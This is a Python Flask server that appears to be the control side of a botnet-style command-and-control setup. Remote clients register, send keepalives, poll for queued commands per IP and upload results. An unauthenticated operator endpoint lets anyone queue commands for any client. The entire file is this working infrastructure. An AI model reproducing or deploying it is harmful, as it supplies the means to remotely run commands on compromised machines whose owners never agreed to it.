from flask import Flask, request, make_response, Response, jsonify, render_template
import redis
import json
import os
import datetime

app = Flask(__name__)
r = redis.Redis(host='redis', port=6379)

@app.route('/')
def index():
    ip_addresses = r.keys('keepalive:*')
    all_ips = [ip.decode('utf-8').split(':')[1] for ip in ip_addresses]

    online_ips = []
    offline_ips = []

    for ip in all_ips:
        if r.exists(f'keepalive:{ip}'):
            online_ips.append(ip)
        else:
            offline_ips.append(ip)

    return render_template('index.html', online_ips=online_ips, offline_ips=offline_ips)


@app.route('/login', methods=['POST'])
def login():
    ip_address = request.remote_addr
    r.set(f'clients:{ip_address}', 1)

    return 'Login successful'

@app.route('/keepalive', methods=['GET'])
def keepalive():
    ip_address = request.remote_addr
    current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    r.set(f'keepalive:{ip_address}', current_time, ex=3600)  # Set expiry for 1 hour (3600 seconds)

    return 'Keepalive recorded'

@app.route('/send' , methods=['POST'])
def send():
    ip_address = request.form.get('ip_address')
    command = request.form.get('command')

    r.rpush(f'commands:{ip_address}', command)

    return 'https://media.tenor.com/rcZMAz3r-fQAAAAM/borat-very.gif'
@app.route('/receive', methods=['GET'])
def receive():
    ip_address = request.remote_addr
    # Retrieve commands for the IP address
    commands = r.lrange(f'commands:{ip_address}', 0, -1)

    r.delete(f'commands:{ip_address}')

    return jsonify({'commands': commands})

@app.route('/result', methods=['POST'])
def result():
    ip_address = request.remote_addr
    results = json.loads(request.form.get('results'))

    for result in results:
        r.rpush(f'results:{ip_address}', json.dumps(result))

    return 'Results received successfully'

@app.route('/get_results', methods=['GET'])
def get_results():
    all_results = {}

    ip_addresses = r.keys('results:*')

    for ip_address in ip_addresses:
        ip = ip_address.decode('utf-8').split(':')[1]

        # Retrieve results for the IP address
        results = r.lrange(ip_address, 0, -1)
        results = [json.loads(result) for result in results]

        r.delete(ip_address)
        all_results[ip] = results

    return jsonify(all_results)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000)